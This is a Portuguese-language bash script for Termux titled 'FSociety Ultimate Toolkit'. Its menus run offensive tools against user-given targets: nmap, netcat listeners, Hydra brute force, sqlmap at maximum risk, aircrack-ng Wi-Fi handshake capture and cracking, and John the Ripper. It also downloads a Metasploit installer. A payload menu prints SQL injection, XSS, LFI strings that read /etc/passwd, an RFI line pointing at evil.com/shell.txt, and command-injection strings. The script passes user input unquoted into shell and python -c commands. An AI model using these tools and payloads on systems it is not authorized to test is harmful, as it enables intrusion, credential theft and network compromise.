#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

install_dependencies() {
    echo -e "${YELLOW}[*] Instalando dependências...${NC}"
    pkg update -y && pkg upgrade -y
    pkg install -y python3 python2 git wget curl nmap hydra ruby php openssh clang make
    
    pip3 install requests beautifulsoup4 scapy python-whois phonenumbers
    gem install lolcat
}

main_menu() {
    clear
    echo -e "${RED}"
    echo "   _____ _____ _____ _____ _____ _____ _____ "
    echo "  |  ___|  _  |     |   __|   __|_   _|   __|"
    echo "  |  _||     | | | |  |  |__   |  | | |   __|"
    echo "  |_|  |__|__|_|_|_|_____|_____|  |_| |_____|"
    echo -e "${BLUE}"
    echo "         FSociety Ultimate Toolkit v3.0"
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Scanner de Redes e Vulnerabilidades"
    echo -e "${YELLOW}2.${NC} Ferramentas de Ataque e Pentest"
    echo -e "${YELLOW}3.${NC} OSINT e Investigação Digital"
    echo -e "${YELLOW}4.${NC} Database de Falhas e Payloads"
    echo -e "${YELLOW}5.${NC} Ferramentas de Proteção"
    echo -e "${YELLOW}6.${NC} Instalar Todas as Ferramentas"
    echo -e "${YELLOW}7.${NC} Sair"
    
    read -p "Selecione: " choice
    
    case $choice in
        1) network_scanner ;;
        2) attack_tools ;;
        3) osint_tools ;;
        4) exploits_db ;;
        5) protection_tools ;;
        6) install_all ;;
        7) exit 0 ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; sleep 1; main_menu ;;
    esac
}

network_scanner() {
    clear
    echo -e "${GREEN}"
    echo "  ___ _   _ _____ _   _ _____ _____ _____ ___  _____ "
    echo " | _ \ | | |_   _| | | |  ___|  ___|_   _/ _ \|  ___|"
    echo " |  _/ |_| | | | | |_| | |__ | |__   | || | | | |__  "
    echo " |_|  \___/  |_|  \___/|____||____|  |_||_| |_|____|"
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Nmap (Scanner Completo)"
    echo -e "${YELLOW}2.${NC} Netcat (Conexões RAW)"
    echo -e "${YELLOW}3.${NC} Wireshark (TShark CLI)"
    echo -e "${YELLOW}4.${NC} Ping Sweep"
    echo -e "${YELLOW}5.${NC} DNS Recon"
    echo -e "${YELLOW}6.${NC} Voltar"
    
    read -p "Selecione: " opt
    
    case $opt in
        1)
            read -p "Alvo (IP/Domínio): " target
            nmap -sS -sV -A -T4 $target | lolcat
            ;;
        2)
            read -p "Porta: " port
            echo -e "${BLUE}Modo:${NC}"
            echo "1) Ouvir porta"
            echo "2) Conectar a porta"
            read -p "Opção: " nc_opt
            
            case $nc_opt in
                1) nc -lvp $port ;;
                2) read -p "IP: " ip; nc $ip $port ;;
                *) echo -e "${RED}[!] Inválido!${NC}" ;;
            esac
            ;;
        3)
            echo -e "${BLUE}Iniciando TShark...${NC}"
            tshark -i wlan0
            ;;
        4)
            read -p "Rede (ex: 192.168.1): " network
            for ip in {1..254}; do
                ping -c 1 $network.$ip | grep "bytes from" &
            done
            ;;
        5)
            read -p "Domínio: " domain
            dig ANY $domain
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; network_scanner ;;
    esac
    
    read -p "Continuar..."; network_scanner
}

attack_tools() {
    clear
    echo -e "${RED}"
    echo "   ___ _____ _____ _____ _  _______ _____ _   _ _____ "
    echo "  / _ \_   _|_   _|_   _| |/ /_   _|_   _| | | |  ___|"
    echo " / /_\ \| |   | |   | | | ' /  | |   | | | |_| | |__  "
    echo " |  _  || |   | |   | | |  <   | |   | | |  _  |  __| "
    echo " | | | || |  _| |_  | | | . \ _| |_ _| |_| | | | |___ "
    echo " \_| |_/\_/  \___/  \_/ \_|\_\___/ \___/\_| |_/____/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Metasploit Framework"
    echo -e "${YELLOW}2.${NC} Hydra (Força Bruta)"
    echo -e "${YELLOW}3.${NC} SQLmap (SQL Injection)"
    echo -e "${YELLOW}4.${NC} Aircrack-ng (WiFi)"
    echo -e "${YELLOW}5.${NC} John the Ripper (Quebra Senhas)"
    echo -e "${YELLOW}6.${NC} Voltar"
    
    read -p "Selecione: " opt
    
    case $opt in
        1)
            echo -e "${BLUE}Iniciando Metasploit...${NC}"
            ./metasploit.sh
            ;;
        2)
            read -p "Alvo (IP): " target
            read -p "Serviço (ssh/ftp/http): " service
            read -p "Lista de usuários: " user_list
            read -p "Lista de senhas: " pass_list
            hydra -L $user_list -P $pass_list $target $service
            ;;
        3)
            read -p "URL vulnerável: " url
            sqlmap -u "$url" --risk=3 --level=5 --batch
            ;;
        4)
            echo -e "${BLUE}1. Capturar handshake"
            echo "2. Quebrar handshake"
            read -p "Opção: " wifi_opt
            
            case $wifi_opt in
                1)
                    airmon-ng start wlan0
                    airodump-ng wlan0mon
                    ;;
                2)
                    read -p "Arquivo .cap: " cap_file
                    read -p "Wordlist: " wordlist
                    aircrack-ng $cap_file -w $wordlist
                    ;;
                *) echo -e "${RED}[!] Inválido!${NC}" ;;
            esac
            ;;
        5)
            read -p "Arquivo hash: " hash_file
            john --format=raw-md5 $hash_file
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; attack_tools ;;
    esac
    
    read -p "Continuar..."; attack_tools
}

osint_tools() {
    clear
    echo -e "${BLUE}"
    echo "   ___  _____ _   _ _____ _____ _____ "
    echo "  / _ \|  _  | \ | |_   _|_   _|_   _|"
    echo " / /_\ \ | | |  \| | | |   | |   | |  "
    echo " |  _  | | | | . \` | | |   | |   | |  "
    echo " | | | \ \_/ / |\  |_| |_  | |  _| |_ "
    echo " \_| |_/\___/\_| \_/\___/  \_/  \___/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Consulta de Email (Have I Been Pwned)"
    echo -e "${YELLOW}2.${NC} Consulta de Telefone (PhoneInfoga)"
    echo -e "${YELLOW}3.${NC} Busca por Username (Sherlock)"
    echo -e "${YELLOW}4.${NC} Analisador de Metadados"
    echo -e "${YELLOW}5.${NC} Verificação de Domínio"
    echo -e "${YELLOW}6.${NC} Voltar"
    
    read -p "Selecione: " opt
    
    case $opt in
        1)
            read -p "Email: " email
            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq .
            ;;
        2)
            read -p "Número (com código país): " phone
            python3 -c "import phonenumbers; from phonenumbers import carrier, geocoder; num = phonenumbers.parse('$phone'); print('Operadora:', carrier.name_for_number(num, 'pt')); print('Região:', geocoder.description_for_number(num, 'pt')); print('Válido:', phonenumbers.is_valid_number(num))"
            ;;
        3)
            read -p "Username: " username
            python3 -c "import os; os.system('sherlock $username')"
            ;;
        4)
            read -p "Arquivo: " file
            exiftool $file
            ;;
        5)
            read -p "Domínio: " domain
            whois $domain
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; osint_tools ;;
    esac
    
    read -p "Continuar..."; osint_tools
}

exploits_db() {
    clear
    echo -e "${RED}"
    echo "  _____ _____ _____ _   _ _____ __  __ _____ _    _ _____ "
    echo " |  ___|  ___|_   _| | | |_   _|  \/  |_   _| |  | |  ___|"
    echo " | |__ | |__   | | | |_| | | | | .  . | | | | |  | | |__  "
    echo " |  __||  __|  | | |  _  | | | | |\/| | | | | |/\| |  __| "
    echo " | |___| |___ _| |_| | | |_| |_| |  | |_| |_\  /\  / |___ "
    echo " \____/\____/ \___/\_| |_/\___/ \_|  |_/\___/ \/  \/\____/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} SQL Injection Payloads"
    echo -e "${YELLOW}2.${NC} XSS Payloads"
    echo -e "${YELLOW}3.${NC} LFI/RFI Payloads"
    echo -e "${YELLOW}4.${NC} Comandos Injection"
    echo -e "${YELLOW}5.${NC} Proteção Contra Falhas"
    echo -e "${YELLOW}6.${NC} Voltar"
    
    read -p "Selecione: " opt
    
    case $opt in
        1)
            echo -e "${BLUE}SQLi Payloads:${NC}"
            echo "' OR 1=1 --"
            echo "admin'--"
            echo "1' ORDER BY 1--"
            echo "1' UNION SELECT null,table_name FROM information_schema.tables--"
            ;;
        2)
            echo -e "${BLUE}XSS Payloads:${NC}"
            echo "<script>alert(1)</script>"
            echo "<img src=x onerror=alert(1)>"
            echo "\";alert(1);//"
            ;;
        3)
            echo -e "${BLUE}LFI/RFI Payloads:${NC}"
            echo "../../../../etc/passwd"
            echo "php://filter/convert.base64-encode/resource=index.php"
            echo "http://evil.com/shell.txt"
            ;;
        4)
            echo -e "${BLUE}Command Injection:${NC}"
            echo ";id"
            echo "|ls -la"
            echo "`whoami`"
            ;;
        5)
            echo -e "${GREEN}Proteções:${NC}"
            echo "1. Use Prepared Statements"
            echo "2. Validar/Sanitizar inputs"
            echo "3. WAF (ModSecurity)"
            echo "4. Headers de Segurança"
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; exploits_db ;;
    esac
    
    read -p "Continuar..."; exploits_db
}

install_all() {
    echo -e "${YELLOW}[*] Instalando todas as ferramentas...${NC}"
   
    pkg install -y nmap hydra sqlmap aircrack-ng john
    
    pip3 install sherlock phonenumbers
    wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.0.8/phoneinfoga_$(uname -s)_$(uname -m).tar.gz
    tar xvf phoneinfoga_*.tar.gz
    mv phoneinfoga /data/data/com.termux/files/usr/bin/


    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
    chmod +x metasploit.sh
    
    echo -e "${GREEN}[+] Todas ferramentas instaladas!${NC}"
    sleep 2
    main_menu
}

protection_tools() {
    clear
    echo -e "${GREEN}"
    echo "  ___ ___ _____ ___   ___ _____ ___ ___ _____ ___ "
    echo " | _ \ _ \_   _/ _ \ / __|_   _| _ \_ _|_   _/ _ \"
    echo " |  _/   / | || (_) | (__  | | |   /| |  | || (_) |"
    echo " |_| |_|_\ |_| \___/ \___| |_| |_|_\___| |_| \___/"
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Verificar Portas Abertas"
    echo -e "${YELLOW}2.${NC} Testar Headers de Segurança"
    echo -e "${YELLOW}3.${NC} Analisar Vulnerabilidades Web"
    echo -e "${YELLOW}4.${NC} Gerar Senha Segura"
    echo -e "${YELLOW}5.${NC} Verificar Vazamentos de Email"
    echo -e "${YELLOW}6.${NC} Voltar"
    
    read -p "Selecione: " opt
    
    case $opt in
        1)
            echo -e "${BLUE}Portas abertas locais:${NC}"
            netstat -tuln
            ;;
        2)
            read -p "URL: " url
            curl -s -I $url | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
            ;;
        3)
            read -p "URL: " url
            nikto -h $url
            ;;
        4)
            echo -e "${BLUE}Senha gerada:${NC}"
            openssl rand -base64 16
            ;;
        5)
            read -p "Email: " email
            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq .
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Inválido!${NC}"; protection_tools ;;
    esac
    
    read -p "Continuar..."; protection_tools
}

install_dependencies
main_menu
